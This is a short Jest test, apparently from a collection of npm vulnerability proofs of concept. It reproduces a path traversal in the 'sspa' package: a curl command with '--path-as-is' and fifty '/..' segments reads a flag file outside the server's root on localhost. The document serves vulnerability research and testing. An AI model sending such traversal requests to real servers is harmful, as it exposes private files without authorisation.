//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/sspa/test.js

const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in sspa", (done) => {
    const fs = require("fs");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    var pkg = require('sspa').main();

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr()}"`;

    exec(attack_string, (error, stdout) => {
        expect(stdout).toBe(hostsFile);
        done();
    });
});
